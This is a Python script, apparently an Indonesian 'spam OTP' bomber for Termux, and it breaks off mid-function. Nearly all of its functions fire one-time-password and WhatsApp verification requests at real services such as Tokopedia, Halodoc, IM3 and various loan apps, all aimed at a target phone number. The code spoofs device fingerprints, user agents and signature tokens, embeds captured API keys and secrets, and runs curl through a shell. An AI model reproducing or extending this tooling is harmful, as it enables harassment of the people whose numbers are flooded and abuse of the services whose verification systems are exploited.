import os
import sys
import time
import re
import json
import hmac
import secrets
import requests
import threading
import random
import base64
import uuid
import phonenumbers
import subprocess
import hashlib
import socket
import platform
import string
import signal
import smtplib
import getpass
import urllib.request
import urllib.error
import urllib3
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from phonenumbers import NumberParseException
from phonenumbers import geocoder, carrier, timezone as phone_timezone
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote, unquote
from colorama import Fore, Back, init
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from wcwidth import wcswidth
from rich.panel import Panel
from rich.console import Console
from phonenumbers import geocoder, carrier, timezone, PhoneNumberType, NumberParseException
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

SESSION_FILE = '/data/data/com.termux/files/home/.otp_session.json'

a = '\x1b[1;30m'
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
c = '\x1b[1;36m'
p = '\x1b[1;37m'
r = '\x1b[0m'

def update_leaderboard(value):
    pass

def kirim_log_aktivitas(activity, number):
    pass
    
def spam_otp_codex(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spam_otp_nilai(response, start, end):
    try:
        idx = response.find(start)
        if idx == -1:
            return None
        idx += len(start)
        tail = response[idx:]
        end_idx = tail.find(end)
        if end_idx == -1:
            return None
        return tail[:end_idx]
    except:
        return None

def spam_otp_im3(nomor):
    try:
        session = requests.Session()
        url = "https://myim3api1.ioh.co.id/api/v2/otp/send/web"
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload = {
            "msisdn": nomor,
            "action": "register"
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_singa_v1(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False
        
def spam_otp_singa_v2(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_singa_v3(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False
 
def spam_otp_singa_v4(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False

def spam_otp_singa_v5(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor = nomor
        else:
            nomor = '0' + nomor
        
        models = ['SM-S928B', 'SM-G965N', 'SM-N975F', 'SM-A515F', 'SM-M127F', 'Infinix X6532C', 'Redmi Note 10', 'POCO X3', 'vivo 2007', 'OPPO CPH2083']
        model = random.choice(models)
        
        versions = ['2.4.7', '2.4.8', '2.4.9', '2.5.0', '2.5.1']
        versionName = random.choice(versions)
        versionCode = versionName.replace('.', '')
        
        systemVersions = ['11', '12', '13', '14']
        systemVersion = random.choice(systemVersions)
        
        appsflyer_id = str(int(time.time() * 1000)) + '-' + str(random.randint(1000000000000000000, 9999999999999999999))
        
        session = requests.Session()
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': f'Mozilla/5.0 (Linux; Android {systemVersion}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
        }
        
        url = f'https://api102.singa.id/new/login/sendWaOtp?versionName={versionName}&versionCode={versionCode}&model={model}&systemVersion={systemVersion}&platform=android&appsflyer_id={appsflyer_id}'
        
        payload = {
            'mobile_phone': nomor,
            'type': 'mobile',
            'is_switchable': 1
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '"msg":"', '"') == 'Success'
    except:
        return False
                     
def spam_otp_ktakilat(nomor):
    try:
        import requests, json, base64, random

        device_data = {
            "adChannel": "organic",
            "adId": "15497a9b-2669-42cf-ad10-d0d0d8f50ad0",
            "androidId": ''.join(random.choices('abcdef0123456789', k=16)),
            "appName": "KtaKilat",
            "appVersion": "5.2.6",
            "countryCode": "ID",
            "countryName": "Indonesia",
            "cpuCores": 4,
            "deliveryPlatform": "google play",
            "deviceNo": ''.join(random.choices('abcdef0123456789', k=16)),
            "imei": "",
            "imsi": "",
            "mac": "00:db:34:3b:e5:67",
            "memoryTotal": 4137971712,
            "packageName": "com.ktakilat.loan",
            "phoneBrand": "samsung",
            "phoneBrandModel": "SM-G965N",
            "sdCardTotal": 35139592192,
            "systemPlatform": "android",
            "systemVersion": "9",
            "uuid": ''.join(random.choices('abcdef0123456789', k=32))
        }
        device_info = base64.b64encode(json.dumps(device_data).encode()).decode()

        headers = {
            'Content-Type': 'application/json; charset=UTF-8',
            'Device-Info': device_info
        }
        payload = {'mobileNo': nomor, 'smsType': 1}

        resp = requests.post('https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode', 
                            json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_uangme(nomor):
    try:
        aid = f'gaid_15497a9b-2669-42cf-ad10-{spam_otp_codex(12)}'
        url = f'https://api.uangme.com/api/v2/sms_code?phone={nomor}&scene_type=login&send_type=wp'
        headers = {'aid': aid, 'android_id': 'b787045b140c631f', 'app_version': '300504', 'brand': 'samsung', 'carrier': '00', 'Content-Type': 'application/x-www-form-urlencoded', 'country': '510', 'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0', 'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo', 'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0', 'lan': 'in_ID', 'model': 'SM-G965N', 'ns': 'wifi', 'os': '1', 'timestamp': '1732178536', 'tz': 'Asia%2FBangkok', 'User-Agent': 'okhttp/3.12.1', **{'v': '1', 'version': '28'}}
        res = requests.get(url, headers=headers, timeout=10)
    except:
        return False

def spam_otp_tokopedia(nomor):
    try:
        session = requests.Session() 
        url_token = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search('<input\\s+id=\"Token\"\\s+value=\"([^\"]+)\"', resp.text)
        if not token:
            return False
        url_otp = 'https://accounts.tokopedia.com/otp/c/ajax/request-wa'
        data = {'otp_type': '116', 'msisdn': nomor, 'tk': token.group(1), 'email': '', 'original_param': '', 'user_id': '', 'signature': '', 'number_otp_digit': '6'}
        headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['X-Requested-With'] = 'XMLHttpRequest'
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False

def format_nomor(nomor):
    nomor = nomor.strip().replace(' ', '').replace('-', '')
    if nomor.startswith('0'):
        phone = '+62' + nomor[1:]
        username = '0' + nomor[1:]
    elif nomor.startswith('62'):
        phone = '+' + nomor
        username = '0' + nomor[2:]
    elif nomor.startswith('+62'):
        phone = nomor
        username = '0' + nomor[3:]
    else:
        phone = '+62' + nomor
        username = '0' + nomor
    return (phone, username)

def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        session = requests.Session()
        url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp'
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'ciam-type': 'FR', 'content-type': 'application/json', 'origin': 'https://duniagames.co.id', 'referer': 'https://duniagames.co.id/', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-device': '1ee352b7-d541-418f-a7b9-82d9358ea6a4'}
        payload = {'phoneNumber': phone, 'userName': username}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_uku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
      
        import secrets
        
        imei = secrets.token_hex(16)
        
        headers = {
            "Host": "gateway.ukuindo.com",
            "Accept": "application/json",
            "Appsflyerid": "1739206918799-3547019681597550358",
            "Device": "ANDROID",
            "Distinctid": "undefined",
            "Imei": imei,
            "Version": "6092201",
            "Versioncode": "6.9.22",
            "Accept-Language": "id_ID",
            "Adid": "",
            "Channel": "GooglePlay",
            "Product": "uku",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }
        
        payload = {
            "phone": nomor_lokal,
            "smsType": "SMS",
            "channel": "GooglePlay",
            "appInstanceId": ""
        }
        
        response = requests.post(
            "https://gateway.ukuindo.com/entrance/v3/getcode",
            headers=headers,
            json=payload
        )
        
        return response
        
    except Exception as e:
        return None

def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        payload = {'mobileNumber': nomor_lokal, 'type': 'prospect-create', 'channel': 'whatsapp'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_yogyaonline(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        session.get('https://www.yogyaonline.co.id/register', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        headers = {'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://www.yogyaonline.co.id', 'referer': 'https://www.yogyaonline.co.id/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}
        resp = session.post('https://www.yogyaonline.co.id/api/v1/send-otp', json={'phone_number': nomor_lokal}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_kitabisa_wea(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        
        curl_command = f'''curl -s -X POST 'https://gate.kitabisa.com/wong/register/draft' \
  -H 'accept: application/json' \
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'content-type: application/json' \
  -H 'origin: https://accounts.kitabisa.com' \
  -H 'referer: https://accounts.kitabisa.com/' \
  -H 'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' \
  -H 'version: 3.4.0' \
  -H 'x-ktbs-api-version: 1.0.0' \
  -H 'x-ktbs-client-name: kanvas' \
  -H 'x-ktbs-client-version: 1.0.0' \
  -H 'x-ktbs-platform-name: kanvas' \
  -H 'x-ktbs-request-id: 1c3f6c98-2007-4124-933a-946348406887' \
  -H 'x-ktbs-signature: cf6bb271fda15fb3083a336e71b27db7d3e6b410a2026d7e377f1cd5cdb83645' \
  -H 'x-ktbs-time: 1782837706' \
  -d '{{"full_name":"Fahri reza","username":"{nomor}","otp_type":"whatsapp"}}' '''
        
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            try:
                return json.loads(result.stdout)
            except:
                return result.stdout
        else:
            return {"error": result.stderr}
            
    except Exception as e:
        return {"error": str(e)}

def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://m.bantusaku.id', 'referer': 'https://m.bantusaku.id/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-auth-token': 'null', 'x-device-os': 'web', 'x-merchant': 'BantuSaku', 'x-token-sign': unique_code, 'x-version': 'web-3.2.1'}
        payload = {'phone': nomor_lokal, 'type': 'register', 'imageCode': '', 'merchantNo': 'BantuSaku', 'uniquCode': unique_code}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_kreditpintar(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor
        uuid_val = str(__import__('uuid').uuid4())
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'content-type': 'application/json', 'origin': 'https://go.kreditpintar.com', 'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-adv-market-channel': 'OfficialWebsite', 'x-adv-uuid': uuid_val, 'x-app-version': 'APPVERSION_NAME(9999)', 'x-os-type': 'WEB', 'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'}
        resp = session.post('https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id', json={'mobileNumber': nomor, 'type': 'SMS'}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_byu(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp'
        headers = {'accept': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ3NDk2NzQiLCJhcCI6IjExMjA0MzgyNjEiLCJpZCI6IjBhZmM0ODY2ZDY3MWU5MzM3OTk3YWUxY2M5ZDEwMzI1NTQ1ZWM1YmVhMzkzMzVjIiwidHIiOiIwYWZjNDg2NmQ2NzFlOTMzNzk5N2FlMWNjOWQxMDMyNTU0NWVjNWJlYTM5MzM1YyIsImZlIjoiMTc3NzYwNzYzODUyOCIsInByIjoiMS40NzQ5MTc0LTExMjA0MzgyNjEtNTU0NWVjNWJlYTM5MzM1Yy0tMTc3NzYwNzYzODUyOCIsInR0IjoxLCJ0ayI6IjE4NjM1MTkiLCJzIjoiMDEifX0=', 'origin': 'https://pidaw-webfront.cx.byu.id', 'referer': 'https://pidaw-webfront.cx.byu.id/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'slocation': 'CL', 'traceparent': '00-0afcc4866d671e9337997ae1cc9d1032-5545ec5bea39335c-01', 'tracestate': '1863519@nr=0-1-4749174-1120438261-5545ec5bea39335c----1777607638528', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-deviceid': '17776076111271930882471', **{'x-request-id': 'a33150a0-87cd-48ea-89ad-7314024949aa'}}
        payload = {'identifier': nomor_lokal, 'channel': 'web'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False
        
def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        import subprocess
        import json

        payload = json.dumps({
            "credentials": nomor_lokal
        })

        curl_cmd = f"""curl -s -X POST 'https://api.maulagi.id/api/v2/auth/check' \\
  -H 'host: api.maulagi.id' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://maulagi.id' \\
  -H 'referer: https://maulagi.id/' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36' \\
  -H 'x-ml-key: C43BBQWN43' \\
  -d '{payload}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True if result.stdout else False
        return False

    except:
        return False

def spam_otp_vedantu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        session = requests.Session()
        session.get('https://www.vedantu.com/', 
            headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=10
        )
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'cookie': 'v-auth-token=8HQ63zA7QqVd8mMu; auth-token=8Hq63zA7QqVd8mMU'
        }
        
        payload = {
            "email": None,
            "phoneCode": 62,
            "phoneNumber": nomor,
            "version": 2,
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3DD29934CD6723BA8151D3E"
        }
        
        url = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
        response = session.post(url, headers=headers, json=payload, timeout=15)
        
        if response.status_code == 200:
            try:
                data = response.json()
                return data.get('status') == 'SUCCESS' or data.get('success') == True
            except:
                return response.status_code == 200
        return False
        
    except Exception as e:
        return False

def spam_otp_swiggy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()
        session = requests.Session()
        session.get('https://www.swiggy.com/auth', headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate, br'}, timeout=10)
        resp = session.post('https://www.swiggy.com/mapi/auth/signup', json={'name': nama, 'email': '', 'mobile': nomor, 'password': '', 'referral_code': '', 'countryCode': '62', 'countryKey': 'IN'}, headers={'accept': '*/*', '__fetch_req__': 'true', 'content-type': 'application/json', 'origin': 'https://www.swiggy.com', 'platform': 'mweb', 'referer': 'https://www.swiggy.com/auth/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'user-id': '0', 'Accept-Encoding': 'gzip, deflate, br'}, timeout=10)
        data = resp.json()
    except:
        return False

def spam_otp_internetrakyat(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'Accept': 'application/json, text/plain, */*', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://internetrakyat.id', 'Referer': 'https://internetrakyat.id/auth/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-api-key': '280999!FTTH'}
        resp = session.post('https://internetrakyat.id/api/app/auth/send-otp-register', json={'phone_number': nomor}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_pinjamduit(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': BASE, 'Referer': BASE + '/h5/download_selfmedia.html'}
        r1 = session.post(BASE + '/gw/loan/credit-user/checkPhoneWeb', headers=headers, data={'phone': nomor, 'mobilePhone': nomor, 'uuid': str(uuid.uuid4()), 'deviceId': 'wh', 'appMarket': 'web', 'appVersion': '99.99.99', 'clientType': 'w', 'ts': int(time.time() * 1000)}, timeout=10)
        res1 = r1.json()
        if res1.get('code') != '0':
            return False
        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0
        headers2 = headers.copy()
        headers2['ss'] = wybs
        r2 = session.post(BASE + '/gw/loan/credit-user/checkPhoneNext', headers=headers2, data={'phone': nomor, 'mobilePhone': nomor, 'sms_service': 2, 'sms_useage': sms_useage, 'deviceId': 'wh', 'appMarket': 'web', 'appVersion': '99.99.99', 'clientType': 'w', 'ts': int(time.time() * 1000)}, timeout=10)
        res2 = r2.json()
    except:
        return False

def spam_otp_misteraladin(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        OTP_SECRET = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
        timestamp = int(time.time())
        member_token = hashlib.sha256(f'{OTP_SECRET}{timestamp}'.encode()).hexdigest()
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + str(int(time.time())) + '@gmail.com'
        headers_base = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'authorization': '', 'content-type': 'application/json', 'x-platform': 'mobile-web', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        requests.post('https://m.misteraladin.com/api/members/v2/auth/register-check', headers=headers_base, json={'email': email, 'phone_number_country_code': '62', 'phone_number': nomor}, timeout=10)
        r = requests.post('https://m.misteraladin.com/api/members/v2/otp/request', headers={**headers_base, **{'x-member-token': member_token, 'x-request-time': str(timestamp)}}, json={'phone_number_country_code': '62', 'phone_number': nomor, 'type': 'register'}, timeout=10)
    except:
        return False

def spam_otp_greensm(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        r = requests.post('https://gapi.indo.greensm.com/car/acquisition/create-registration', headers={'accept': '*/*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'HiringSource': 'Iklan di surat kabar atau dalam aplikasi', 'Education': 's2', 'WorkExperience': 'Sopir komersial', 'City': 'BT', 'Type': 'CAR_SHARING', 'Tel': nomor, 'Name': 'Budi Santoso', 'Country': 'ID', 'ReferralCode': '', 'Source': '', 'AffiliateNumber': '', 'Campaign': ''}, timeout=10)
    except:
        return False

def spam_otp_halodoc(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        r = requests.post('https://customers.api.halodoc.com/alor-api/v1/users/authentication/otp/requests', headers={'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'phone_number': nomor, 'channel': 'whatsapp'}, timeout=10)
    except:
        return False
        
import uuid
import random
import string
import requests
import json

def spam_otp_tiptip(nomor):
    try:
        session = requests.Session()
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
       
        if nomor.startswith('+'):
            nomor = nomor[1:]
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        fingerprint = str(uuid.uuid4())
